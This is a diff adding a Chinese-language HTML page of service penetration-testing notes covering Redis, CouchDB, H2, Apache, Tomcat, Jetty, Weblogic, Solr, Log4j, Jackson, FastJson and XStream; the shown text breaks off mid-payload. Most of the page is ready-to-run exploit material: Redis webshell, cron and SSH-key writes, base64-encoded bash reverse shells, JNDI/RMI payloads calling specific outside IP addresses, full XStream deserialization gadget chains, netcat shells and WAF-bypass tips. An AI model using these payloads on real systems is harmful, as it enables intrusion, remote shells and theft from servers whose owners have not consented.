@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>服务攻防知识分享</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin-top: 30px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 5px;
+        }
+
+        h3 {
+            color: #444;
+            margin-top: 25px;
+        }
+
+        pre {
+            background-color: #f8f8f8;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-family: Consolas, Monaco, 'Andale Mono', monospace;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+
+        code {
+            background-color: #f8f8f8;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: Consolas, Monaco, 'Andale Mono', monospace;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        th, td {
+            border: 1px solid #ddd;
+            padding: 12px 15px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+
+        ol, ul {
+            margin: 15px 0;
+            padding-left: 30px;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        .note {
+            background-color: #e7f3fe;
+            border-left: 4px solid #2196F3;
+            padding: 10px 15px;
+            margin: 15px 0;
+        }
+
+        .warning {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 10px 15px;
+            margin: 15px 0;
+        }
+
+        .vulnerability {
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            padding: 20px;
+            margin: 20px 0;
+            background-color: #fafafa;
+        }
+
+        .vulnerability h3 {
+            margin-top: 0;
+            color: #d32f2f;
+        }
+
+        .section {
+            margin-bottom: 40px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>服务攻防知识分享</h1>
+    <a href="index.html">返回知识页面</a>
+
+    <div class="section">
+        <h2>服务攻防概述</h2>
+        <p>服务攻防主要针对各类基础设施组件进行安全研究和渗透测试，包括但不限于数据库、中间件、开发框架等。</p>
+        
+        <h3>数据库</h3>
+        <ul>
+            <li>Mysql、Redis、Couchdb、H2database、PostgreSQL、Hadoop</li>
+        </ul>
+        
+        <h3>中间件</h3>
+        <ul>
+            <li>Apache、Tomcat、Nginx、Weblogic、Jenkins、Jetty、JBoss</li>
+        </ul>
+        
+        <h3>开发语言</h3>
+        <ul>
+            <li>PHP、Java、Python、Ruby、Go、Perl、JavaScript、NodeJS、Lua</li>
+        </ul>
+        
+        <h3>开发框架</h3>
+        <ul>
+            <li>ThinkPHP、Laravel、Yii、Jira、Django、Flask、Vue、NextJS、SpringMVC、SpringBoot、Struts2</li>
+        </ul>
+        
+        <h3>语言组件</h3>
+        <ul>
+            <li>FastJson、Jackson、Xstream、Solr、Shiro、Log4J</li>
+        </ul>
+        
+        <h3>处理平台</h3>
+        <ul>
+            <li>Apache Kafka、RabbitMQ、ActiveMQ、RocketMQ</li>
+        </ul>
+        
+        <h3>大数据LLM</h3>
+    </div>
+
+    <div class="section">
+        <h2>数据库应用-Redis-未授权访问&CVE漏洞</h2>
+        <p><strong>默认端口：</strong>6379</p>
+        <p>Redis是一套开源的使用ANSI C编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的API。Redis如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。</p>
+        
+        <div class="vulnerability">
+            <h3>1、未授权访问：CNVD-2015-07557</h3>
+            <p>redis.conf配置不当：</p>
+            <pre># 注释掉bind行，允许所有IP连接
+# bind 127.0.0.1
+
+# 关闭保护模式（>3.2.0）
+protected-mode no
+
+# 默认密码为空
+# requirepass ""</pre>
+            
+            <h4>- 写Webshell需得到Web路径</h4>
+            <p><strong>利用条件：</strong>Web目录权限可读写</p>
+            <pre>config set dir /tmp            #设置WEB写入目录
+config set dbfilename 1.php    #设置写入文件名
+set test "&lt;?php phpinfo();?&gt;"  #设置写入文件代码
+bgsave                         #保存执行
+save                           #保存执行</pre>
+            <div class="warning">
+                <strong>注意：</strong>部分没目录权限读写权限
+            </div>
+            
+            <h4>- 写定时任务反弹shell</h4>
+            <p><strong>利用条件：</strong>Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态</p>
+            <pre>config set dir /var/spool/cron
+set yy "\n\n\n* * * * * bash -i >& /dev/tcp/101.32.220.14/5566 0>&1\n\n\n"
+config set dbfilename x
+save</pre>
+            <div class="warning">
+                <strong>注意：</strong>centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败
+            </div>
+            
+            <h4>- 写入Linux ssh-key公钥</h4>
+            <p><strong>利用条件：</strong>Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态，允许使用密钥登录</p>
+            <pre># 在攻击机上执行
+ssh-keygen -t rsa
+cd /root/.ssh/
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+cat key.txt | redis-cli -h 目标IP -x set xxx
+
+# 通过Redis执行
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save
+
+# 连接目标服务器
+ssh -i id_rsa root@目标IP</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、未授权访问-CNVD-2019-21763</h3>
+            <p>由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。</p>
+            <pre># 使用redis-rogue-getshell工具
+python redis-master.py -r 123.58.224.8 -p 52666 -L 101.32.220.14 -P 8888 -f RedisModulesSDK/exp.so -c "id"
+
+# 使用redis-rogue-server工具
+python redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost IP</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>3、沙箱绕过RCE-CVE-2022-0543</h3>
+            <pre>eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0</pre>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>数据库应用-Couchdb-未授权越权&CVE漏洞</h2>
+        <p><strong>默认端口：</strong>5984</p>
+        
+        <div class="vulnerability">
+            <h3>- Couchdb 垂直权限绕过（CVE-2017-12635）</h3>
+            <p>访问: http://xx.xx.xx.xx:5984/_utils/</p>
+            <ol>
+                <li>先创建管理员用户</li>
+                <li>登录用户授权</li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>- Couchdb 命令执行（CVE-2017-12636）</h3>
+            <ol>
+                <li>下载exp.py</li>
+                <li>修改目标和反弹地址</li>
+                <li>Python3调用执行即可</li>
+            </ol>
+            <pre># 漏洞利用脚本
+https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>- Couchdb 代码执行（CVE-2022-24706）</h3>
+            <pre># 漏洞利用脚本
+https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2022-24706/poc.py
+
+# 执行命令
+python poc.py target-ip 4369</pre>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>数据库应用-H2database-未授权访问&CVE漏洞</h2>
+        <p><strong>默认端口：</strong>20051</p>
+        <p>Java SQL 数据库 H2,H2的主要特点是：非常快，开源，JDBC API；嵌入式和服务器模式；内存数据库；基于浏览器的控制台应用程序。H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在v2.1.210+中修复。2.1.210 之前的H2控制台允许远程攻击者通过包含子字符串的jdbc:h2:mem JDBC URL执行任意代码。</p>
+        
+        <div class="vulnerability">
+            <h3>- JNDI RCE（CVE-2021-42392）</h3>
+            <ol>
+                <li>Driver class填写为javax.naming.InitialContext</li>
+                <li>JDBC URL填写为前面项目Java-Chains生成的JNDI URL</li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>- JDBC RCE（CVE-2022-23221）</h3>
+            <p><strong>1、未授权进入：</strong></p>
+            <pre>jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;\</pre>
+            
+            <p><strong>2、RCE执行反弹：</strong></p>
+            <pre># 创建数据库文件：xx.sql
+CREATE TABLE test (
+    id INT NOT NULL
+);
+CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript
+Java.type("java.lang.Runtime").getRuntime().exec("bash -c {echo,base64加密的反弹shell指令}|{base64,-d}|{bash,-i}");';
+
+# 反弹指令示例：bash -i >& /dev/tcp/x.x.x.x/5566 0>&1
+
+# 启动提供SQL文件远程加载服务
+python3 -m http.server 端口
+
+# 填入Payload使其加载远程SQL
+jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM 'http://101.32.220.14:88/h2.sql';\</pre>
+            <p>监听端口：<code>nc -lvvp xxxx</code></p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Apache漏洞</h2>
+        <p>Apache基金会开源的一款流行的HTTP服务器</p>
+        
+        <div class="vulnerability">
+            <h3>1、SSRF漏洞（CVE-2021-40438）</h3>
+            <p>影响版本：2.4.48</p>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、路径穿越漏洞（CVE-2021-41773 CVE-2021-42013）</h3>
+            <p>影响版本：2.4.49, 2.4.50</p>
+            <pre># 文件读取
+curl -v --path-as-is http://123.58.224.8:19615/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+
+# 命令执行
+curl -v --data "echo;id" 'http://123.58.224.8:19615//cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'</pre>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Tomcat漏洞</h2>
+        <p>一个开源的Java Servlet容器和Web服务器</p>
+        
+        <div class="vulnerability">
+            <h3>1、控制台利用（配置不当）</h3>
+            <p><strong>条件：</strong>口令登录控制台</p>
+            <p>Tomcat支持在控制台部署war文件，可以直接将WebShell部署到Web目录下</p>
+            <ol>
+                <li>先爆破弱口令</li>
+                <li>压缩后门zip改war</li>
+                <li>上传war访问后门链接</li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、AJP文件包含漏洞（CVE-2020-1938）</h3>
+            <p>Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>3、远程代码执行漏洞（CVE-2025-24813）</h3>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Jetty漏洞</h2>
+        <p>一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
+        
+        <div class="vulnerability">
+            <h3>1、信息泄露漏洞（CVE-2021-28169）</h3>
+            <p>对于<= 9.4.40、<= 10.0.2、<= 11.0.2的Eclipse Jetty版本，对带有双重编码路径的ConcatServlet的请求可以访问WEB-INF目录中的受保护资源。</p>
+            <pre>curl -v http://123.58.224.8:16187/static?/%2557EB-INF/web.xml</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、信息泄露漏洞（CVE-2021-34429）</h3>
+            <p>对于9.4.37-9.4.42、10.0.1-10.0.5和11.0.1-11.0.5的Eclipse Jetty版本，可以使用一些编码字符来制作URI以访问WEB-INF目录的内容和/或绕过一些安全限制。</p>
+            <pre># Burpsuite抓包
+GET /%u002e/WEB-INF/web.xml</pre>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Weblogic漏洞</h2>
+        <p>一个基于Java的企业级应用服务器</p>
+        <p><strong>特征：</strong>端口7001和页面</p>
+        
+        <div class="vulnerability">
+            <h3>1、弱口令、部署WebShell</h3>
+            <p>参考默认密码：<a href="https://cirt.net/passwords" target="_blank">https://cirt.net/passwords</a></p>
+            <ol>
+                <li>部署概要->安装->制作war并上传->修改路由->访问</li>
+                <li>制作war：<code>jar cvf 1.war 1.jsp</code></li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、未授权远程RCE漏洞（CVE-2023-21839，CVE-2020-14882）</h3>
+            <p>使用WeblogicTool项目</p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Solr漏洞</h2>
+        <p>主要基于HTTP和Apache Lucene实现的全文搜索服务器。</p>
+        <p>历史漏洞：<a href="https://avd.aliyun.com/search?q=Solr" target="_blank">https://avd.aliyun.com/search?q=Solr</a></p>
+        <p><strong>黑盒特征：</strong>图标及端口8393</p>
+        
+        <div class="vulnerability">
+            <h3>1、命令执行（CVE-2019-17558）</h3>
+            <p>Apache Solr 5.0.0版本至8.3.1</p>
+            <pre># 利用工具
+https://github.com/jas502n/solr_rce
+
+# 执行命令
+D:\Python27\python.exe solr_rce.py http://123.58.236.76:50847 id</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、远程命令执行漏洞(CVE-2019-0193)</h3>
+            <p>Apache Solr &lt; 8.2.0版本</p>
+            <p><strong>条件1：</strong>Apache Solr的DataImportHandler启用了模块DataImportHandler(默认不会被启用)</p>
+            <p><strong>条件2：</strong>Solr Admin UI未开启鉴权认证。（默认情况无需任何认证）</p>
+            <pre>&lt;dataConfig&gt;
+  &lt;dataSource type="URLDataSource"/&gt;
+  &lt;script&gt;&lt;![CDATA[
+          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}");
+          }
+  ]]&gt;&lt;/script&gt;
+  &lt;document&gt;
+    &lt;entity name="stackoverflow"
+            url="https://stackoverflow.com/feeds/tag/solr"
+            processor="XPathEntityProcessor"
+            forEach="/feed"
+            transformer="script:poc" /&gt;
+  &lt;/document&gt;
+&lt;/dataConfig&gt;</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>3、认证绕过漏洞（CVE-2024-45216）</h3>
+            <pre>GET /solr/admin/info/properties:/admin/info/key</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>4.文件上传路径遍历漏洞（CVE-2024-52012）</h3>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Log4j漏洞</h2>
+        <p>Apache的一个开源项目，是一个基于Java的日志记录框架。</p>
+        <p>历史漏洞：<a href="https://avd.aliyun.com/search?q=Log4j" target="_blank">https://avd.aliyun.com/search?q=Log4j</a></p>
+        <p><strong>黑盒特征：</strong>盲打 会问蓝队攻击特征(${jndi:rmi:///osutj8})</p>
+        
+        <div class="vulnerability">
+            <h3>Log4j2远程命令执行（CVE-2021-44228）</h3>
+            <p>漏洞影响的产品版本包括：Apache Log4j2 2.0 - 2.15.0-rc1</p>
+            
+            <pre># 生成反弹Shell的JNDI注入
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 47.94.236.117
+
+# 构造JNDI注入Payload提交
+${jndi:rmi://47.94.236.117:1099/osutj8}
+
+# 网页上提交需要url编码
+%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%34%37%2e%39%34%2e%32%33%36%2e%31%31%37%3a%31%30%39%39%2f%6f%73%75%74%6a%38%7d</pre>
+            
+            <h4>黑盒检测：</h4>
+            <ol>
+                <li>Java应用</li>
+                <li>请求参数数据以json/xml格式发送测试</li>
+                <li>Content-Type: application/xml 或 json</li>
+                <li>报错提示到了使用的类名</li>
+            </ol>
+            
+            <h4>黑盒判断：</h4>
+            <p>通过提交数据报错信息得到什么组件</p>
+            <ul>
+                <li>xml格式(xstream)</li>
+                <li>json 格式（fastjson jackson）</li>
+            </ul>
+            
+            <p><strong>白盒：</strong>直接看引用组件版本</p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>J2EE-组件Jackson漏洞</h2>
+        <p>当下流行的json解释器，主要负责处理Json的序列化和反序列化</p>
+        
+        <div class="vulnerability">
+            <h3>1、代码执行 (CVE-2020-8840)</h3>
+            <p>2.0.0 <= FasterXML jackson-databind Version <= 2.9.10.2</p>
+            <pre>String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/Exploit\"}]";</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、代码执行 （CVE-2020-35728）</h3>
+            <p>FasterXML jackson-databind 2.x < 2.9.10.8</p>
+            <pre>String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"rmi://47.94.236.117:1099/gtaafz\"}]";</pre>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>J2EE-组件FastJson漏洞</h2>
+        <p>阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
+        <p>利用POC集合：</p>
+        <ul>
+            <li><a href="https://github.com/kezibei/fastjson_payload" target="_blank">https://github.com/kezibei/fastjson_payload</a></li>
+            <li><a href="https://mp.weixin.qq.com/s/t8sjv0Zg8_KMjuW4t-bE-w" target="_blank">https://mp.weixin.qq.com/s/t8sjv0Zg8_KMjuW4t-bE-w</a></li>
+        </ul>
+        <p>历史漏洞：<a href="https://avd.aliyun.com/search?q=fastjson" target="_blank">https://avd.aliyun.com/search?q=fastjson</a></p>
+        
+        <div class="vulnerability">
+            <h3>FastJson <= 1.2.24</h3>
+            <pre>String payload = "{\r\n"
+        + "    \"a\": {\r\n"
+        + "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \r\n"
+        + "        \"dataSourceName\": \"rmi://127.0.0.1:1099/Object\", \r\n"
+        + "        \"autoCommit\": true\r\n"
+        + "    }\r\n"
+        + "}";</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>FastJson <= 1.2.47</h3>
+            <pre>JSONObject jsonToObject = JSON.parseObject("{\n" +
+                "    \"a\":{\n" +
+                "        \"@type\":\"java.lang.Class\",\n" +
+                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
+                "    },\n" +
+                "    \"b\":{\n" +
+                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
+                "        \"dataSourceName\":\"rmi://47.94.236.117:1099/j2azgf\",\n" +
+                "        \"autoCommit\":true\n" +
+                "    }\n" +
+                "}");</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>FastJson <= 1.2.80</h3>
+            <p>利用poc只能用项目中调用的组件和类文件</p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>J2EE-组件XStream漏洞</h2>
+        <p>开源Java类库，能将对象序列化成XML或XML反序列化为对象</p>
+        <p>历史漏洞：<a href="https://avd.aliyun.com/search?q=XStream" target="_blank">https://avd.aliyun.com/search?q=XStream</a></p>
+        
+        <div class="vulnerability">
+            <h3>1、代码执行 (CVE-2021-21351)</h3>
+            <p>Xstream<=1.4.15</p>
+            <pre># 生成反弹Shell的JNDI注入
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 47.94.236.117
+
+# 构造JNDI注入Payload提交
+&lt;sorted-set&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;ysomap&lt;/type&gt;
+    &lt;value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'&gt;
+      &lt;m__DTMXRTreeFrag&gt;
+        &lt;m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'&gt;
+          &lt;m__size&gt;-10086&lt;/m__size&gt;
+          &lt;m__mgrDefault&gt;
+            &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;
+            &lt;m__incremental&gt;false&lt;/m__incremental&gt;
+            &lt;m__source__location&gt;false&lt;/m__source__location&gt;
+            &lt;m__dtms&gt;
+              &lt;null/&gt;
+            &lt;/m__dtms&gt;
+            &lt;m__defaultHandler/&gt;
+          &lt;/m__mgrDefault&gt;
+          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;
+          &lt;m__indexing&gt;false&lt;/m__indexing&gt;
+          &lt;m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'&gt;
+            &lt;fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt;
+              &lt;javax.sql.rowset.BaseRowSet&gt;
+                &lt;default&gt;
+                  &lt;concurrency&gt;1008&lt;/concurrency&gt;
+                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;
+                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;
+                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;
+                  &lt;isolation&gt;2&lt;/isolation&gt;
+                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;
+                  &lt;maxRows&gt;0&lt;/maxRows&gt;
+                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;
+                  &lt;readOnly&gt;true&lt;/readOnly&gt;
+                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;
+                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;
+                  &lt;dataSource&gt;rmi://evil-ip:1099/example&lt;/dataSource&gt;
+                  &lt;listeners/&gt;
+                  &lt;params/&gt;
+                &lt;/default&gt;
+              &lt;/javax.sql.rowset.BaseRowSet&gt;
+              &lt;com.sun.rowset.JdbcRowSetImpl&gt;
+                &lt;default/&gt;
+              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
+            &lt;/fPullParserConfig&gt;
+            &lt;fConfigSetInput&gt;
+              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;
+              &lt;name&gt;setAutoCommit&lt;/name&gt;
+              &lt;parameter-types&gt;
+                &lt;class&gt;boolean&lt;/class&gt;
+              &lt;/parameter-types&gt;
+            &lt;/fConfigSetInput&gt;
+            &lt;fConfigParse reference='../fConfigSetInput'/&gt;
+            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;
+          &lt;/m__incrementalSAXSource&gt;
+          &lt;m__walker&gt;
+            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;
+          &lt;/m__walker&gt;
+          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;
+          &lt;m__idAttributes/&gt;
+          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;
+          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;
+          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;
+        &lt;/m__dtm&gt;
+        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;
+      &lt;/m__DTMXRTreeFrag&gt;
+      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;
+      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;ysomap&lt;/type&gt;
+    &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
+      &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+&lt;/sorted-set&gt;</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>2、远程代码执行 （CVE-2021-29505）</h3>
+            <p>XStream <= 1.4.16</p>
+            <pre># 生成反弹Shell的反序列化JNDI注入
+java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMTIwLjIyNS4yMTEvNTU2NiAwPiYx}|{base64,-d}|{bash,-i}"
+
+# 构造反序列化JNDI注入Payload提交
+&lt;java.util.PriorityQueue serialization='custom'&gt;
+    &lt;unserializable-parents/&gt;
+    &lt;java.util.PriorityQueue&gt;
+        &lt;default&gt;
+            &lt;size&gt;2&lt;/size&gt;
+        &lt;/default&gt;
+        &lt;int&gt;3&lt;/int&gt;
+        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &lt;type&gt;12345&lt;/type&gt;
+            &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
+                &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;
+            &lt;/value&gt;
+        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &lt;type&gt;12345&lt;/type&gt;
+            &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;
+                &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;
+                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
+                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
+                    &lt;bodyParts/&gt;
+                    &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
+                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
+                        &lt;nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;
+                            &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;
+                                &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;
+                                    &lt;names&gt;
+                                        &lt;string&gt;aa&lt;/string&gt;
+                                        &lt;string&gt;aa&lt;/string&gt;
+                                    &lt;/names&gt;
+                                    &lt;ctx&gt;
+                                        &lt;environment/&gt;
+                                        &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;
+                                            &lt;java.rmi.server.RemoteObject&gt;
+                                                &lt;string&gt;UnicastRef&lt;/string&gt;
+                                                &lt;string&gt;47.94.236.117&lt;/string&gt;
+                                                &lt;int&gt;1089&lt;/int&gt;
+                                                &lt;long&gt;0&lt;/long&gt;
+                                                &lt;int&gt;0&lt;/int&gt;
+                                                &lt;long&gt;0&lt;/long&gt;
+                                                &lt;short&gt;0&lt;/short&gt;
+                                                &lt;boolean&gt;false&lt;/boolean&gt;
+                                            &lt;/java.rmi.server.RemoteObject&gt;
+                                        &lt;/registry&gt;
+                                        &lt;host&gt;47.94.236.117&lt;/host&gt;
+                                        &lt;port&gt;1089&lt;/port&gt;
+                                    &lt;/ctx&gt;
+                                &lt;/candidates&gt;
+                            &lt;/aliases&gt;
+                        &lt;/nullIter&gt;
+                    &lt;/sm&gt;
+                &lt;/message&gt;
+            &lt;/value&gt;
+        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;</pre>
+            
+            <div class="note">
+                <p><strong>WAF绕过技巧：</strong>发送这些payload可能遇到WAF，使用Unicode编码、大小写、注释插入如 /**/, //, --, #等、空白符填充等可能绕过WAF</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>FastJson绕过技巧</h2>
+        
+        <div class="vulnerability">
+            <h3>#FastJson-JDK高版本绕过(1245-jdk8u342)</h3>
+            <ol>
+                <li>burp插件FastjsonScan4Burp判断出FastJson及版本特征</li>
+                <li>利用JNDI注入未成功转高版本利用,<a href="https://github.com/B4aron1/JNDIBypass" target="_blank">https://github.com/B4aron1/JNDIBypass</a></li>
+            </ol>
+            <pre>java -jar JNDIBypass.jar -a 0.0.0.0 -p 1389 -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzIuMjIwLjE0Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"
+
+{
+    "a": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "ldap://101.32.220.14:1389/AoKhk",
+        "autoCommit": true
+    }
+}
+
+# 监听反弹
+nc -lvvp 9999</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#FastJson-编码特性WAF绕过(1247-jndi-waf)</h3>
+            <p>修改docker-compose.yml(user: root)</p>
+            <p><a href="https://github.com/lemono0/FastJsonParty/issues/4" target="_blank">https://github.com/lemono0/FastJsonParty/issues/4</a></p>
+            <ol>
+                <li>插件判断出FastJson及版本特征</li>
+                <li>利用JNDI注入未成功转编码绕过利用，Fastjson本身是默认识别并解码hex和unicode编码的，可以利用这个特性绕过</li>
+            </ol>
+            <pre>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc 101.32.220.14 9999 -e sh" -A 101.32.220.14
+nc -lvvp 9999
+
+{
+    "a": {
+        "@type": "java.lang.Class",
